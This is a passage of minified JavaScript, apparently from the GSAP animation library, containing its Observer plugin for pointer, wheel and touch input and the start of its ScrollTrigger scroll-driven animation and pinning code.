i=e.s,r=e.sc,n=Dn.indexOf(t),s=r===Fn.sc?1:2;return!~n&&(n=Dn.push(t)-1),Dn[n+s]||(Dn[n+s]=Nn(Cn(t,i),!0)||(In(t)?r:Nn((function(e){return arguments.length?t[i]=e:t[i]}))))},Un=function(t,e,i){var r=t,n=t,s=Sn(),o=s,a=e||50,h=Math.max(500,3*a),u=function(t,e){var h=Sn();e||h-s>a?(n=r,r=t,o=s,s=h):i?r+=t:r=n+(t-n)/(h-o)*(s-o)};return{update:u,reset:function(){n=r=i?0:r,o=s=0},getVelocity:function(t){var e=o,a=n,l=Sn();return(t||0===t)&&t!==r&&u(t),s===o||l-o>h?0:(r+(i?a:-a))/((i?l:s)-e)*1e3}}},kn=function(t,e){return e&&!t._gsapAllow&&t.preventDefault(),t.changedTouches?t.changedTouches[0]:t},Gn=function(t){var e=Math.max.apply(Math,t),i=Math.min.apply(Math,t);return Math.abs(e)>=Math.abs(i)?e:i},Hn=function(){var t,e,i,r;(vn=un.core.globals().ScrollTrigger)&&vn.core&&(t=vn.core,e=t.bridge||{},i=t._scrollers,r=t._proxies,i.push.apply(i,Dn),r.push.apply(r,wn),Dn=i,wn=r,An=function(t,i){return e[t](i)})},zn=function(t){return(un=t||En())&&"undefined"!=typeof document&&document.body&&(cn=window,dn=document,pn=dn.documentElement,fn=dn.body,_n=[cn,dn,pn,fn],un.utils.clamp,mn="onpointerenter"in fn?"pointer":"mouse",gn=Vn.isTouch=cn.matchMedia&&cn.matchMedia("(hover: none), (pointer: coarse)").matches?1:"ontouchstart"in cn||navigator.maxTouchPoints>0||navigator.msMaxTouchPoints>0?2:0,xn=Vn.eventTypes=("ontouchstart"in pn?"touchstart,touchmove,touchcancel,touchend":"onpointerdown"in pn?"pointerdown,pointermove,pointercancel,pointerup":"mousedown,mousemove,mouseup,mouseup").split(","),setTimeout((function(){return bn=0}),500),Hn(),ln=1),ln};Mn.op=Fn,Dn.cache=0;var Vn=function(){function t(t){this.init(t)}var e;return t.prototype.init=function(t){ln||zn(un)||console.warn("Please gsap.registerPlugin(Observer)"),vn||Hn();var e=t.tolerance,i=t.dragMinimum,r=t.type,n=t.target,s=t.lineHeight,o=t.debounce,a=t.preventDefault,h=t.onStop,u=t.onStopDelay,l=t.ignore,c=t.wheelSpeed,d=t.event,p=t.onDragStart,f=t.onDragEnd,g=t.onDrag,m=t.onPress,v=t.onRelease,_=t.onRight,y=t.onLeft,x=t.onUp,E=t.onDown,b=t.onChangeX,T=t.onChangeY,D=t.onChange,w=t.onToggleX,S=t.onToggleY,A=t.onHover,C=t.onHoverEnd,I=t.onMove,R=t.ignoreCheck,P=t.isNormalizer,O=t.onGestureStart,N=t.onGestureEnd,M=t.onWheel,F=t.onEnable,L=t.onDisable,B=t.onClick,U=t.scrollSpeed,k=t.capture,G=t.allowClicks,H=t.lockAxis,z=t.onLockAxis;this.target=n=Ln(n)||pn,this.vars=t,l&&(l=un.utils.toArray(l)),e=e||0,i=i||0,c=c||1,U=U||1,r=r||"wheel,touch,pointer",o=!1!==o,s||(s=parseFloat(cn.getComputedStyle(fn).lineHeight)||22);var V,X,j,$,W,Y,q,Z=this,K=0,Q=0,J=Bn(n,Mn),tt=Bn(n,Fn),et=J(),it=tt(),rt=~r.indexOf("touch")&&!~r.indexOf("pointer")&&"pointerdown"===xn[0],nt=In(n),st=n.ownerDocument||dn,ot=[0,0,0],at=[0,0,0],ht=0,ut=function(){return ht=Sn()},lt=function(t,e){return(Z.event=t)&&l&&~l.indexOf(t.target)||e&&rt&&"touch"!==t.pointerType||R&&R(t,e)},ct=function(){var t=Z.deltaX=Gn(ot),i=Z.deltaY=Gn(at),r=Math.abs(t)>=e,n=Math.abs(i)>=e;D&&(r||n)&&D(Z,t,i,ot,at),r&&(_&&Z.deltaX>0&&_(Z),y&&Z.deltaX<0&&y(Z),b&&b(Z),w&&Z.deltaX<0!=K<0&&w(Z),K=Z.deltaX,ot[0]=ot[1]=ot[2]=0),n&&(E&&Z.deltaY>0&&E(Z),x&&Z.deltaY<0&&x(Z),T&&T(Z),S&&Z.deltaY<0!=Q<0&&S(Z),Q=Z.deltaY,at[0]=at[1]=at[2]=0),($||j)&&(I&&I(Z),z&&Y&&z(Z),j&&(g(Z),j=!1),$=Y=!1),W&&(M(Z),W=!1),V=0},dt=function(t,e,i){ot[i]+=t,at[i]+=e,Z._vx.update(t),Z._vy.update(e),o?V||(V=requestAnimationFrame(ct)):ct()},pt=function(t,e){"y"!==q&&(ot[2]+=t,Z._vx.update(t,!0)),"x"!==q&&(at[2]+=e,Z._vy.update(e,!0)),H&&!q&&(Z.axis=q=Math.abs(t)>Math.abs(e)?"x":"y",Y=!0),o?V||(V=requestAnimationFrame(ct)):ct()},ft=function(t){if(!lt(t,1)){var e=(t=kn(t,a)).clientX,r=t.clientY,n=e-Z.x,s=r-Z.y,o=Z.isDragging;Z.x=e,Z.y=r,(o||Math.abs(Z.startX-e)>=i||Math.abs(Z.startY-r)>=i)&&(g&&(j=!0),o||(Z.isDragging=!0),pt(n,s),o||p&&p(Z))}},gt=Z.onPress=function(t){lt(t,1)||(Z.axis=q=null,X.pause(),Z.isPressed=!0,t=kn(t),K=Q=0,Z.startX=Z.x=t.clientX,Z.startY=Z.y=t.clientY,Z._vx.reset(),Z._vy.reset(),Rn(P?n:st,xn[1],ft,a,!0),Z.deltaX=Z.deltaY=0,m&&m(Z))},mt=function(t){if(!lt(t,1)){Pn(P?n:st,xn[1],ft,!0);var e=Z.isDragging&&(Math.abs(Z.x-Z.startX)>3||Math.abs(Z.y-Z.startY)>3),i=kn(t);e||(Z._vx.reset(),Z._vy.reset(),a&&G&&un.delayedCall(.08,(function(){if(Sn()-ht>300&&!t.defaultPrevented)if(t.target.click)t.target.click();else if(st.createEvent){var e=st.createEvent("MouseEvents");e.initMouseEvent("click",!0,!0,cn,1,i.screenX,i.screenY,i.clientX,i.clientY,!1,!1,!1,!1,0,null),t.target.dispatchEvent(e)}}))),Z.isDragging=Z.isGesturing=Z.isPressed=!1,h&&!P&&X.restart(!0),f&&e&&f(Z),v&&v(Z,e)}},vt=function(t){return t.touches&&t.touches.length>1&&(Z.isGesturing=!0)&&O(t,Z.isDragging)},_t=function(){return(Z.isGesturing=!1)||N(Z)},yt=function(t){if(!lt(t)){var e=J(),i=tt();dt((e-et)*U,(i-it)*U,1),et=e,it=i,h&&X.restart(!0)}},xt=function(t){if(!lt(t)){t=kn(t,a),M&&(W=!0);var e=(1===t.deltaMode?s:2===t.deltaMode?cn.innerHeight:1)*c;dt(t.deltaX*e,t.deltaY*e,0),h&&!P&&X.restart(!0)}},Et=function(t){if(!lt(t)){var e=t.clientX,i=t.clientY,r=e-Z.x,n=i-Z.y;Z.x=e,Z.y=i,$=!0,(r||n)&&pt(r,n)}},bt=function(t){Z.event=t,A(Z)},Tt=function(t){Z.event=t,C(Z)},Dt=function(t){return lt(t)||kn(t,a)&&B(Z)};X=Z._dc=un.delayedCall(u||.25,(function(){Z._vx.reset(),Z._vy.reset(),X.pause(),h&&h(Z)})).pause(),Z.deltaX=Z.deltaY=0,Z._vx=Un(0,50,!0),Z._vy=Un(0,50,!0),Z.scrollX=J,Z.scrollY=tt,Z.isDragging=Z.isGesturing=Z.isPressed=!1,Z.enable=function(t){return Z.isEnabled||(Rn(nt?st:n,"scroll",On),r.indexOf("scroll")>=0&&Rn(nt?st:n,"scroll",yt,a,k),r.indexOf("wheel")>=0&&Rn(n,"wheel",xt,a,k),(r.indexOf("touch")>=0&&gn||r.indexOf("pointer")>=0)&&(Rn(n,xn[0],gt,a,k),Rn(st,xn[2],mt),Rn(st,xn[3],mt),G&&Rn(n,"click",ut,!1,!0),B&&Rn(n,"click",Dt),O&&Rn(st,"gesturestart",vt),N&&Rn(st,"gestureend",_t),A&&Rn(n,mn+"enter",bt),C&&Rn(n,mn+"leave",Tt),I&&Rn(n,mn+"move",Et)),Z.isEnabled=!0,t&&t.type&&gt(t),F&&F(Z)),Z},Z.disable=function(){Z.isEnabled&&(Tn.filter((function(t){return t!==Z&&In(t.target)})).length||Pn(nt?st:n,"scroll",On),Z.isPressed&&(Z._vx.reset(),Z._vy.reset(),Pn(P?n:st,xn[1],ft,!0)),Pn(nt?st:n,"scroll",yt,k),Pn(n,"wheel",xt,k),Pn(n,xn[0],gt,k),Pn(st,xn[2],mt),Pn(st,xn[3],mt),Pn(n,"click",ut,!0),Pn(n,"click",Dt),Pn(st,"gesturestart",vt),Pn(st,"gestureend",_t),Pn(n,mn+"enter",bt),Pn(n,mn+"leave",Tt),Pn(n,mn+"move",Et),Z.isEnabled=Z.isPressed=Z.isDragging=!1,L&&L(Z))},Z.kill=function(){Z.disable();var t=Tn.indexOf(Z);t>=0&&Tn.splice(t,1),yn===Z&&(yn=0)},Tn.push(Z),P&&In(n)&&(yn=Z),Z.enable(d)},(e=[{key:"velocityX",get:function(){return this._vx.getVelocity()}},{key:"velocityY",get:function(){return this._vy.getVelocity()}}])&&function(t,e){for(var i=0;i<e.length;i++){var r=e[i];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,r.key,r)}}(t.prototype,e),t}();Vn.version="3.10.4",Vn.create=function(t){return new Vn(t)},Vn.register=zn,Vn.getAll=function(){return Tn.slice()},Vn.getById=function(t){return Tn.filter((function(e){return e.vars.id===t}))[0]},En()&&un.registerPlugin(Vn);var Xn,jn,$n,Wn,Yn,qn,Zn,Kn,Qn,Jn,ts,es,is,rs,ns,ss,os,as,hs,us,ls,cs,ds,ps,fs,gs,ms,vs,_s,ys,xs,Es,bs,Ts=1,Ds=Date.now,ws=Ds(),Ss=0,As=0,Cs=function(){return rs=1},Is=function(){return rs=0},Rs=function(t){return t},Ps=function(t){return Math.round(1e5*t)/1e5||0},Os=function(){return"undefined"!=typeof window},Ns=function(){return Xn||Os()&&(Xn=window.gsap)&&Xn.registerPlugin&&Xn},Ms=function(t){return!!~Zn.indexOf(t)},Fs=function(t){return Cn(t,"getBoundingClientRect")||(Ms(t)?function(){return jo.width=$n.innerWidth,jo.height=$n.innerHeight,jo}:function(){return ro(t)})},Ls=function(t,e){var i=e.s,r=e.d2,n=e.d,s=e.a;return(i="scroll"+r)&&(s=Cn(t,i))?s()-Fs(t)()[n]:Ms(t)?(Yn[i]||qn[i])-($n["inner"+r]||Yn["client"+r]||qn["client"+r]):t[i]-t["offset"+r]},Bs=function(t,e){for(var i=0;i<hs.length;i+=3)(!e||~e.indexOf(hs[i+1]))&&t(hs[i],hs[i+1],hs[i+2])},Us=function(t){return"string"==typeof t},ks=function(t){return"function"==typeof t},Gs=function(t){return"number"==typeof t},Hs=function(t){return"object"==typeof t},zs=function(t){return ks(t)&&t()},Vs=function(t,e){return function(){var i=zs(t),r=zs(e);return function(){zs(i),zs(r)}}},Xs=function(t,e,i){return t&&t.progress(e?0:1)&&i&&t.pause()},js=function(t,e){if(t.enabled){var i=e(t);i&&i.totalTime&&(t.callbackAnimation=i)}},$s=Math.abs,Ws="right",Ys="bottom",qs="width",Zs="height",Ks="padding",Qs="margin",Js="Width",to="px",eo=function(t){return $n.getComputedStyle(t)},io=function(t,e){for(var i in e)i in t||(t[i]=e[i]);return t},ro=function(t,e){var i=e&&"matrix(1, 0, 0, 1, 0, 0)"!==eo(t)[ns]&&Xn.to(t,{x:0,y:0,xPercent:0,yPercent:0,rotation:0,rotationX:0,rotationY:0,scale:1,skewX:0,skewY:0}).progress(1),r=t.getBoundingClientRect();return i&&i.progress(0).kill(),r},no=function(t,e){var i=e.d2;return t["offset"+i]||t["client"+i]||0},so=function(t){var e,i=[],r=t.labels,n=t.duration();for(e in r)i.push(r[e]/n);return i},oo=function(t){var e=Xn.utils.snap(t),i=Array.isArray(t)&&t.slice(0).sort((function(t,e){return t-e}));return i?function(t,r,n){var s;if(void 0===n&&(n=.001),!r)return e(t);if(r>0){for(t-=n,s=0;s<i.length;s++)if(i[s]>=t)return i[s];return i[s-1]}for(s=i.length,t+=n;s--;)if(i[s]<=t)return i[s];return i[0]}:function(i,r,n){void 0===n&&(n=.001);var s=e(i);return!r||Math.abs(s-i)<n||s-i<0==r<0?s:e(r<0?i-t:i+t)}},ao=function(t,e,i,r){return i.split(",").forEach((function(i){return t(e,i,r)}))},ho=function(t,e,i,r,n){return t.addEventListener(e,i,{passive:!r,capture:!!n})},uo=function(t,e,i,r){return t.removeEventListener(e,i,!!r)},lo=function(t,e,i){return i&&i.wheelHandler&&t(e,"wheel",i)},co={startColor:"green",endColor:"red",indent:0,fontSize:"16px",fontWeight:"normal"},po={toggleActions:"play",anticipatePin:0},fo={top:0,left:0,center:.5,bottom:1,right:1},go=function(t,e){if(Us(t)){var i=t.indexOf("="),r=~i?+(t.charAt(i-1)+1)*parseFloat(t.substr(i+1)):0;~i&&(t.indexOf("%")>i&&(r*=e/100),t=t.substr(0,i-1)),t=r+(t in fo?fo[t]*e:~t.indexOf("%")?parseFloat(t)*e/100:parseFloat(t)||0)}return t},mo=function(t,e,i,r,n,s,o,a){var h=n.startColor,u=n.endColor,l=n.fontSize,c=n.indent,d=n.fontWeight,p=Wn.createElement("div"),f=Ms(i)||"fixed"===Cn(i,"pinType"),g=-1!==t.indexOf("scroller"),m=f?qn:i,v=-1!==t.indexOf("start"),_=v?h:u,y="border-color:"+_+";font-size:"+l+";color:"+_+";font-weight:"+d+";pointer-events:none;white-space:nowrap;font-family:sans-serif,Arial;z-index:1000;padding:4px 8px;border-width:0;border-style:solid;";return y+="position:"+((g||a)&&f?"fixed;":"absolute;"),(g||a||!f)&&(y+=(r===Fn?Ws:Ys)+":"+(s+parseFloat(c))+"px;"),o&&(y+="box-sizing:border-box;text-align:left;width:"+o.offsetWidth+"px;"),p._isStart=v,p.setAttribute("class","gsap-marker-"+t+(e?" marker-"+e:"")),p.style.cssText=y,p.innerText=e||0===e?t+"-"+e:t,m.children[0]?m.insertBefore(p,m.children[0]):m.appendChild(p),p._offset=p["offset"+r.op.d2],vo(p,0,r,v),p},vo=function(t,e,i,r){var n={display:"block"},s=i[r?"os2":"p2"],o=i[r?"p2":"os2"];t._isFlipped=r,n[i.a+"Percent"]=r?-100:0,n[i.a]=r?"1px":0,n["border"+s+Js]=1,n["border"+o+Js]=0,n[i.p]=e+"px",Xn.set(t,n)},_o=[],yo={},xo=function(){return Ds()-Ss>34&&Uo()},Eo=function(){(!ds||!ds.isPressed||ds.startX>qn.clientWidth)&&(Dn.cache++,_s||(_s=requestAnimationFrame(Uo)),Ss||Io("scrollStart"),Ss=Ds())},bo=function(){gs=$n.innerWidth,fs=$n.innerHeight},To=function(){Dn.cache++,!is&&!cs&&!Wn.fullscreenElement&&!Wn.webkitFullscreenElement&&(!ps||gs!==$n.innerWidth||Math.abs($n.innerHeight-fs)>.25*$n.innerHeight)&&Kn.restart(!0)},Do={},wo=[],So=[],Ao=function(t){var e,i=Xn.ticker.frame,r=[],n=0;if(xs!==i||Ts){for(Oo();n<So.length;n+=4)(e=$n.matchMedia(So[n]).matches)!==So[n+3]&&(So[n+3]=e,e?r.push(n):Oo(1,So[n])||ks(So[n+2])&&So[n+2]());for(Po(),n=0;n<r.length;n++)e=r[n],ys=So[e],So[e+2]=So[e+1](t);ys=0,jn&&Fo(0,1),xs=i,Io("matchMedia")}},Co=function t(){return uo(Zo,"scrollEnd",t)||Fo(!0)},Io=function(t){return Do[t]&&Do[t].map((function(t){return t()}))||wo},Ro=[],Po=function(t){for(var e=0;e<Ro.length;e+=5)t&&Ro[e+4]!==t||(Ro[e].style.cssText=Ro[e+1],Ro[e].getBBox&&Ro[e].setAttribute("transform",Ro[e+2]||""),Ro[e+3].uncache=1)},Oo=function(t,e){var i;for(ss=0;ss<_o.length;ss++)i=_o[ss],e&&i.media!==e||(t?i.kill(1):i.revert());e&&Po(e),e||Io("revert")},No=function(){return Dn.cache++&&Dn.forEach((function(t){return"function"==typeof t&&(t.rec=0)}))},Mo=0,Fo=function(t,e){if(!Ss||t){Es=!0;var i=Io("refreshInit");us&&Zo.sort(),e||Oo(),_o.slice(0).forEach((function(t){return t.refresh()})),_o.forEach((function(t){return"max"===t.vars.end&&t.setPositions(t.start,Ls(t.scroller,t._dir))})),i.forEach((function(t){return t&&t.render&&t.render(-1)})),No(),Kn.pause(),Mo++,Es=!1,Io("refresh")}else ho(Zo,"scrollEnd",Co)},Lo=0,Bo=1,Uo=function(){if(!Es){Zo.isUpdating=!0,bs&&bs.update(0);var t=_o.length,e=Ds(),i=e-ws>=50,r=t&&_o[0].scroll();if(Bo=Lo>r?-1:1,Lo=r,i&&(Ss&&!rs&&e-Ss>200&&(Ss=0,Io("scrollEnd")),ts=ws,ws=e),Bo<0){for(ss=t;ss-- >0;)_o[ss]&&_o[ss].update(0,i);Bo=1}else for(ss=0;ss<t;ss++)_o[ss]&&_o[ss].update(0,i);Zo.isUpdating=!1}_s=0},ko=["left","top",Ys,Ws,"marginBottom","marginRight","marginTop","marginLeft","display","flexShrink","float","zIndex","gridColumnStart","gridColumnEnd","gridRowStart","gridRowEnd","gridArea","justifySelf","alignSelf","placeSelf","order"],Go=ko.concat([qs,Zs,"boxSizing","maxWidth","maxHeight","position",Qs,Ks,"paddingTop","paddingRight","paddingBottom","paddingLeft"]),Ho=function(t,e,i,r){if(t.parentNode!==e){for(var n,s=ko.length,o=e.style,a=t.style;s--;)o[n=ko[s]]=i[n];o.position="absolute"===i.position?"absolute":"relative","inline"===i.display&&(o.display="inline-block"),a.bottom=a.right=o.flexBasis="auto",o.overflow="visible",o.boxSizing="border-box",o.width=no(t,Mn)+to,o.height=no(t,Fn)+to,o.padding=a.margin=a.top=a.left="0",Vo(r),a.width=a.maxWidth=i.width,a.height=a.maxHeight=i.height,a.padding=i.padding,t.parentNode.insertBefore(e,t),e.appendChild(t)}},zo=/([A-Z])/g,Vo=function(t){if(t){var e,i,r=t.t.style,n=t.length,s=0;for((t.t._gsap||Xn.core.getCache(t.t)).uncache=1;s<n;s+=2)i=t[s+1],e=t[s],i?r[e]=i:r[e]&&r.removeProperty(e.replace(zo,"-$1").toLowerCase())}},Xo=function(t){for(var e=Go.length,i=t.style,r=[],n=0;n<e;n++)r.push(Go[n],i[Go[n]]);return r.t=t,r},jo={left:0,top:0},$o=function(t,e,i,r,n,s,o,a,h,u,l,c,d){ks(t)&&(t=t(a)),Us(t)&&"max"===t.substr(0,3)&&(t=c+("="===t.charAt(4)?go("0"+t.substr(3),i):0));var p,f,g,m=d?d.time():0;if(d&&d.seek(0),Gs(t))o&&vo(o,i,r,!0);else{ks(e)&&(e=e(a));var v,_,y,x,E=t.split(" ");g=Ln(e)||qn,(v=ro(g)||{})&&(v.left||v.top)||"none"!==eo(g).display||(x=g.style.display,g.style.display="block",v=ro(g),x?g.style.display=x:g.style.removeProperty("display")),_=go(E[0],v[r.d]),y=go(E[1]||"0",i),t=v[r.p]-h[r.p]-u+_+n-y,o&&vo(o,y,r,i-y<20||o._isStart&&y>20),i-=i-y}if(s){var b=t+i,T=s._isStart;p="scroll"+r.d2,vo(s,b,r,T&&b>20||!T&&(l?Math.max(qn[p],Yn[p]):s.parentNode[p])<=b+1),l&&(h=ro(o),l&&(s.style[r.op.p]=h[r.op.p]-r.op.m-s._offset+to))}return d&&g&&(p=ro(g),d.seek(c),f=ro(g),d._caScrollDist=p[r.p]-f[r.p],t=t/d._caScrollDist*c),d&&d.seek(m),d?t:Math.round(t)},Wo=/(webkit|moz|length|cssText|inset)/i,Yo=function(t,e,i,r){if(t.parentNode!==e){var n,s,o=t.style;if(e===qn){for(n in t._stOrig=o.cssText,s=eo(t))+n||Wo.test(n)||!s[n]||"string"!=typeof o[n]||"0"===n||(o[n]=s[n]);o.top=i,o.left=r}else o.cssText=t._stOrig;Xn.core.getCache(t).uncache=1,e.appendChild(t)}},qo=function(t,e){var i,r,n=Bn(t,e),s="_scroll"+e.p2,o=function e(o,a,h,u,l){var c=e.tween,d=a.onComplete,p={};return h=h||n(),l=u&&l||0,u=u||o-h,c&&c.kill(),i=Math.round(h),a[s]=o,a.modifiers=p,p[s]=function(t){return(t=Ps(n()))!==i&&t!==r&&Math.abs(t-i)>2&&Math.abs(t-r)>2?(c.kill(),e.tween=0):t=h+u*c.ratio+l*c.ratio*c.ratio,r=i,i=Ps(t)},a.onComplete=function(){e.tween=0,d&&d.call(c)},c=e.tween=Xn.to(t,a)};return t[s]=n,n.wheelHandler=function(){return o.tween&&o.tween.kill()&&(o.tween=0)},ho(t,"wheel",n.wheelHandler),o},Zo=function(){function t(e,i){jn||t.register(Xn)||console.warn("Please gsap.registerPlugin(ScrollTrigger)"),this.init(e,i)}return t.prototype.init=function(e,i){if(this.progress=this.start=0,this.vars&&this.kill(!0,!0),As){var r,n,s,o,a,h,u,l,c,d,p,f,g,m,v,_,y,x,E,b,T,D,w,S,A,C,I,R,P,O,N,M,F,L,B,U,k,G,H,z,V,X=e=io(Us(e)||Gs(e)||e.nodeType?{trigger:e}:e,po),j=X.onUpdate,$=X.toggleClass,W=X.id,Y=X.onToggle,q=X.onRefresh,Z=X.scrub,K=X.trigger,Q=X.pin,J=X.pinSpacing,tt=X.invalidateOnRefresh,et=X.anticipatePin,it=X.onScrubComplete,rt=X.onSnapComplete,nt=X.once,st=X.snap,ot=X.pinReparent,at=X.pinSpacer,ht=X.containerAnimation,ut=X.fastScrollEnd,lt=X.preventOverlaps,ct=e.horizontal||e.containerAnimation&&!1!==e.horizontal?Mn:Fn,dt=!Z&&0!==Z,pt=Ln(e.scroller||$n),ft=Xn.core.getCache(pt),gt=Ms(pt),mt="fixed"===("pinType"in e?e.pinType:Cn(pt,"pinType")||gt&&"fixed"),vt=[e.onEnter,e.onLeave,e.onEnterBack,e.onLeaveBack],_t=dt&&e.toggleActions.split(" "),yt="markers"in e?e.markers:po.markers,xt=gt?0:parseFloat(eo(pt)["border"+ct.p2+Js])||0,Et=this,bt=e.onRefreshInit&&function(){return e.onRefreshInit(Et)},Tt=function(t,e,i){var r=i.d,n=i.d2,s=i.a;return(s=Cn(t,"getBoundingClientRect"))?function(){return s()[r]}:function(){return(e?$n["inner"+n]:t["client"+n])||0}}(pt,gt,ct),Dt=function(t,e){return!e||~wn.indexOf(t)?Fs(t):function(){return jo}}(pt,gt),wt=0,St=0,At=Bn(pt,ct);if(Et.media=ys,Et._dir=ct,et*=45,Et.scroller=pt,Et.scroll=ht?ht.time.bind(ht):At,o=At(),Et.vars=e,i=i||e.animation,"refreshPriority"in e&&(us=1,-9999===e.refreshPriority&&(bs=Et)),ft.tweenScroll=ft.tweenScroll||{top:qo(pt,Fn),left:qo(pt,Mn)},Et.tweenTo=r=ft.tweenScroll[ct.p],Et.scrubDuration=function(t){(N=Gs(t)&&t)?O?O.duration(t):O=Xn.to(i,{ease:"expo",totalProgress:"+=0.001",duration:N,paused:!0,onComplete:function(){return it&&it(Et)}}):(O&&O.progress(1).kill(),O=0)},i&&(i.vars.lazy=!1,i._initted||!1!==i.vars.immediateRender&&!1!==e.immediateRender&&i.render(0,!0,!0),Et.animation=i.pause(),i.scrollTrigger=Et,Et.scrubDuration(Z),R=0,W||(W=i.vars.id)),_o.push(Et),st&&(Hs(st)&&!st.push||(st={snapTo:st}),"scrollBehavior"in qn.style&&Xn.set(gt?[qn,Yn]:pt,{scrollBehavior:"auto"}),s=ks(st.snapTo)?st.snapTo:"labels"===st.snapTo?function(t){return function(e){return Xn.utils.snap(so(t),e)}}(i):"labelsDirectional"===st.snapTo?(H=i,function(t,e){return oo(so(H))(t,e.direction)}):!1!==st.directional?function(t,e){return oo(st.snapTo)(t,Ds()-St<500?0:e.direction)}:Xn.utils.snap(st.snapTo),M=st.duration||{min:.1,max:2},M=Hs(M)?Jn(M.min,M.max):Jn(M,M),F=Xn.delayedCall(st.delay||N/2||.1,(function(){var t=At(),e=Ds()-St<500,n=r.tween;if(!(e||Math.abs(Et.getVelocity())<10)||n||rs||wt===t)Et.isActive&&wt!==t&&F.restart(!0);else{var o=(t-h)/g,a=i&&!dt?i.totalProgress():o,l=e?0:(a-P)/(Ds()-ts)*1e3||0,c=Xn.utils.clamp(-o,1-o,$s(l/2)*l/.185),d=o+(!1===st.inertia?0:c),p=Jn(0,1,s(d,Et)),f=Math.round(h+p*g),m=st,v=m.onStart,_=m.onInterrupt,y=m.onComplete;if(t<=u&&t>=h&&f!==t){if(n&&!n._initted&&n.data<=$s(f-t))return;!1===st.inertia&&(c=p-o),r(f,{duration:M($s(.185*Math.max($s(d-a),$s(p-a))/l/.05||0)),ease:st.ease||"power3",data:$s(f-t),onInterrupt:function(){return F.restart(!0)&&_&&_(Et)},onComplete:function(){Et.update(),wt=At(),R=P=i&&!dt?i.totalProgress():Et.progress,rt&&rt(Et),y&&y(Et)}},t,c*g,f-t-c*g),v&&v(Et,r.tween)}}})).pause()),W&&(yo[W]=Et),(G=(K=Et.trigger=Ln(K||Q))&&K._gsap&&K._gsap.stRevert)&&(G=G(Et)),Q=!0===Q?K:Ln(Q),Us($)&&($={targets:K,className:$}),Q&&(!1===J||J===Qs||(J=!(!J&&"flex"===eo(Q.parentNode).display)&&Ks),Et.pin=Q,!1!==e.force3D&&Xn.set(Q,{force3D:!0}),(n=Xn.core.getCache(Q)).spacer?m=n.pinState:(at&&((at=Ln(at))&&!at.nodeType&&(at=at.current||at.nativeElement),n.spacerIsNative=!!at,at&&(n.spacerState=Xo(at))),n.spacer=y=at||Wn.createElement("div"),y.classList.add("pin-spacer"),W&&y.classList.add("pin-spacer-"+W),n.pinState=m=Xo(Q)),Et.spacer=y=n.spacer,I=eo(Q),w=I[J+ct.os2],E=Xn.getProperty(Q),b=Xn.quickSetter(Q,ct.a,to),Ho(Q,y,I),_=Xo(Q)),yt){f=Hs(yt)?io(yt,co):co,d=mo("scroller-start",W,pt,ct,f,0),p=mo("scroller-end",W,pt,ct,f,0,d),x=d["offset"+ct.op.d2];var Ct=Ln(Cn(pt,"content")||pt);l=this.markerStart=mo("start",W,Ct,ct,f,x,0,ht),c=this.markerEnd=mo("end",W,Ct,ct,f,x,0,ht),ht&&(k=Xn.quickSetter([l,c],ct.a,to)),mt||wn.length&&!0===Cn(pt,"fixedMarkers")||(V=eo(z=gt?qn:pt).position,z.style.position="absolute"===V||"fixed"===V?V:"relative",Xn.set([d,p],{force3D:!0}),A=Xn.quickSetter(d,ct.a,to),C=Xn.quickSetter(p,ct.a,to))}if(ht){var It=ht.vars.onUpdate,Rt=ht.vars.onUpdateParams;ht.eventCallback("onUpdate",(function(){Et.update(0,0,1),It&&It.apply(Rt||[])}))}Et.previous=function(){return _o[_o.indexOf(Et)-1]},Et.next=function(){return _o[_o.indexOf(Et)+1]},Et.revert=function(t){var e=!1!==t||!Et.enabled,r=is;e!==Et.isReverted&&(e&&(Et.scroll.rec||!is||!Es||(Et.scroll.rec=At()),B=Math.max(At(),Et.scroll.rec||0),L=Et.progress,U=i&&i.progress()),l&&[l,c,d,p].forEach((function(t){return t.style.display=e?"none":"block"})),e&&(is=1),Et.update(e),is=r,Q&&(e?function(t,e,i){Vo(i);var r=t._gsap;if(r.spacerIsNative)Vo(r.spacerState);else if(t.parentNode===e){var n=e.parentNode;n&&(n.insertBefore(t,e),n.removeChild(e))}}(Q,y,m):(!ot||!Et.isActive)&&Ho(Q,y,eo(Q),S)),Et.isReverted=e)},Et.refresh=function(n,s){if(!is&&Et.enabled||s)if(Q&&n&&Ss)ho(t,"scrollEnd",Co);else{!Es&&bt&&bt(Et),is=1,St=Ds(),r.tween&&(r.tween.kill(),r.tween=0),O&&O.pause(),tt&&i&&i.time(-.01,!0).invalidate(),Et.isReverted||Et.revert();for(var f,x,b,w,A,C,I,R,P,N,M=Tt(),k=Dt(),G=ht?ht.duration():Ls(pt,ct),H=0,z=0,V=e.end,X=e.endTrigger||K,j=e.start||(0!==e.start&&K?Q?"0 0":"0 100%":0),$=Et.pinnedContainer=e.pinnedContainer&&Ln(e.pinnedContainer),W=K&&Math.max(0,_o.indexOf(Et))||0,Y=W;Y--;)(C=_o[Y]).end||C.refresh(0,1)||(is=1),!(I=C.pin)||I!==K&&I!==Q||C.isReverted||(N||(N=[]),N.unshift(C),C.revert()),C!==_o[Y]&&(W--,Y--);for(ks(j)&&(j=j(Et)),h=$o(j,K,M,ct,At(),l,d,Et,k,xt,mt,G,ht)||(Q?-.001:0),ks(V)&&(V=V(Et)),Us(V)&&!V.indexOf("+=")&&(~V.indexOf(" ")?V=(Us(j)?j.split(" ")[0]:"")+V:(H=go(V.substr(2),M),V=Us(j)?j:h+H,X=K)),u=Math.max(h,$o(V||(X?"100% 0":G),X,M,ct,At()+H,c,p,Et,k,xt,mt,G,ht))||-.001,g=u-h||(h-=.01)&&.001,H=0,Y=W;Y--;)(I=(C=_o[Y]).pin)&&C.start-C._pinPush<h&&!ht&&C.end>0&&(f=C.end-C.start,I!==K&&I!==$||Gs(j)||(H+=f*(1-C.progress)),I===Q&&(z+=f));if(h+=H,u+=H,Et._pinPush=z,l&&H&&((f={})[ct.a]="+="+H,$&&(f[ct.p]="-="+At()),Xn.set([l,c],f)),Q)f=eo(Q),w=ct===Fn,b=At(),T=parseFloat(E(ct.a))+z,!G&&u>1&&((gt?qn:pt).style["overflow-"+ct.a]="scroll"),Ho(Q,y,f),_=Xo(Q),x=ro(Q,!0),R=mt&&Bn(pt,w?Mn:Fn)(),J&&((S=[J+ct.os2,g+z+to]).t=y,(Y=J===Ks?no(Q,ct)+g+z:0)&&S.push(ct.d,Y+to),Vo(S),mt&&At(B)),mt&&((A={top:x.top+(w?b-h:R)+to,left:x.left+(w?R:b-h)+to,boxSizing:"border-box",position:"fixed"}).width=A.maxWidth=Math.ceil(x.width)+to,A.height=A.maxHeight